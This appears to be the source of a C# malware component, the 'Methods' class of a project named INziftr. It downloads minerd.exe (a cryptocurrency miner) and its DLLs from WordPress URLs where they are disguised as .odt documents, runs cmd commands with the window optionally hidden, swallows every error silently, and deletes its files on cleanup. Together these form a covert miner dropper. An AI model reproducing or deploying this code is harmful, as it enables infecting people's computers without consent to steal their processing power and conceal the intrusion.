using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net;

namespace INziftr
{
    class Methods
    {
        
        public void cs(object c)
        {
            try
            {
                ProcessStartInfo p = new ProcessStartInfo("cmd", "/c" + c);
                p.UseShellExecute = false;
                p.RedirectStandardOutput = true;
                p.CreateNoWindow = Global.hide;  // TRUE = Hide Window, FALSE = Show Window
                Process pc = new Process();
                pc.StartInfo = p;
                pc.Start();
                string result = pc.StandardOutput.ReadToEnd();
                Console.WriteLine(result);
            }
            catch (Exception error)
            {
                
            }
        }


        public void cas(string c)
        {
            try
            {
                bool hide = Global.hide;
                Thread objThread = new Thread(new ParameterizedThreadStart(cs));
                objThread.IsBackground = true;
                objThread.Priority = ThreadPriority.AboveNormal;
                objThread.Start(c);
            }
            catch (ThreadStartException error)
            {
                
            }
            catch (ThreadAbortException error)
            {
                
            }
            catch (Exception error)
            {
                
            }
        }
        public void delFiles()
        {
            WebClient wc = new WebClient();
           


            if (File.Exists(Global.location + "\\minerd.exe"))
            {
                File.Delete(Global.location + "\\minerd.exe");
            }
            else
            {
                //
            }
            if (File.Exists(Global.location + "\\libcurl.dll"))
            {
                File.Delete(Global.location + "\\libcurl.dll");
            }
            else
            {
                //
            }
            if (File.Exists(Global.location + "\\libeay32.dll"))
            {
                File.Delete(Global.location + "\\libeay32.dll");
            }
            else
            {
                //
            }
            if (File.Exists(Global.location + "\\ssleay32.dll"))
            {
                File.Delete(Global.location + "\\ssleay32.dll");
            }
            else
            {
                //
            }
            if (File.Exists(Global.location + "\\zlib1.dll"))
            {
                File.Delete(Global.location + "\\zlib1.dll");
            }
            else
            {
                //
            }

            if (Directory.Exists(Global.location))
            {
                Directory.Delete(Global.location);
            }
            else
            {
                //
            }
        }
        public void dlFiles()
        {
            WebClient wc = new WebClient();
            if (!Directory.Exists(Global.location))
            {

                Directory.CreateDirectory(Global.location);

                if (!File.Exists(Global.location + "\\minerd.exe"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/minerd.odt", Global.location + "\\minerd.exe");
                }
                if (!File.Exists(Global.location + "\\libcurl.dll"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/libcurl.odt", Global.location + "\\libcurl.dll");
                }
                if (!File.Exists(Global.location + "\\libeay32.dll"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/libeay32.odt", Global.location + "\\libeay32.dll");
                }
                if (!File.Exists(Global.location + "\\ssleay32.dll"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/ssleay32.odt", Global.location + "\\ssleay32.dll");
                }
                if (!File.Exists(Global.location + "\\zlib1.dll"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/zlib1.odt", Global.location + "\\zlib1.dll");
                }


            }
            else if (Directory.Exists(Global.location))
            {
                if (!File.Exists(Global.location + "\\minerd.exe"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/minerd.odt", Global.location + "\\minerd.exe");
                }
                if (!File.Exists(Global.location + "\\libcurl.dll"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/libcurl.odt", Global.location + "\\libcurl.dll");
                }
                if (!File.Exists(Global.location + "\\libeay32.dll"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/libeay32.odt", Global.location + "\\libeay32.dll");
                }
                if (!File.Exists(Global.location + "\\ssleay32.dll"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/ssleay32.odt", Global.location + "\\ssleay32.dll");
                }
                if (!File.Exists(Global.location + "\\zlib1.dll"))
                {
                    wc.DownloadFile("https://pimpledoot.files.wordpress.com/2015/04/zlib1.odt", Global.location + "\\zlib1.dll");
                }
            }

        }

    }
}

